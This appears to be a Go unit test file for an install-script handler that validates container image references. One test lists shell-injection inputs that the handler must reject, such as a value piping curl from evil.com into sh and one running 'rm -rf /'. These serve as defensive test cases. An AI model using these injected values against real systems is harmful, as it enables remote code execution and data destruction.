package main

import (
	"net/http"
	"net/http/httptest"
	"testing"
	"text/template"

	"github.com/stretchr/testify/assert"
)

func TestInstallScriptHandler_ValidImageRefs(t *testing.T) {
	handler := testHandler()

	valid := []string{
		"nginx",
		"nginx:latest",
		"ghcr.io/basecamp/once-campfire",
		"ghcr.io/basecamp/fizzy:main",
		"registry.example.com:5000/my/image:v1.2.3",
		"ubuntu@sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
	}
	for _, ref := range valid {
		w := serve(handler, ref)
		assert.Equal(t, http.StatusOK, w.Code, "ref: %s", ref)
	}
}

func TestInstallScriptHandler_RejectsShellInjection(t *testing.T) {
	handler := testHandler()

	malicious := []string{
		"foo';curl evil.com|sh;echo'",
		"$(whoami)",
		"`id`",
		"image;rm -rf /",
		"foo\necho pwned",
		"foo&background",
		"a>b",
		"a<b",
		"foo$(bar)",
		"image name with spaces",
	}
	for _, ref := range malicious {
		w := serve(handler, ref)
		assert.Equal(t, http.StatusBadRequest, w.Code, "ref: %s", ref)
	}
}

func TestInstallScriptHandler_EmptyImageRef(t *testing.T) {
	handler := testHandler()

	w := serve(handler, "")
	assert.Equal(t, http.StatusOK, w.Code)
}

func TestInstallScriptHandler_ExpandsScreenoteForOlderClients(t *testing.T) {
	handler := testHandler()

	w := serve(handler, "screenote")

	assert.Equal(t, http.StatusOK, w.Code)
	assert.Contains(t, w.Body.String(), "IMAGE_REF='ghcr.io/ivankuznetsov/screenote'")
	assert.NotContains(t, w.Body.String(), "IMAGE_REF='screenote'")
}

// Helpers

func testHandler() http.HandlerFunc {
	tmpl := template.Must(template.ParseFS(templateFS, "templates/*"))
	return newInstallScriptHandler(tmpl)
}

func serve(handler http.HandlerFunc, imageRef string) *httptest.ResponseRecorder {
	r := httptest.NewRequest("GET", "/image", nil)
	r.SetPathValue("image", imageRef)
	w := httptest.NewRecorder()
	handler(w, r)
	return w
}
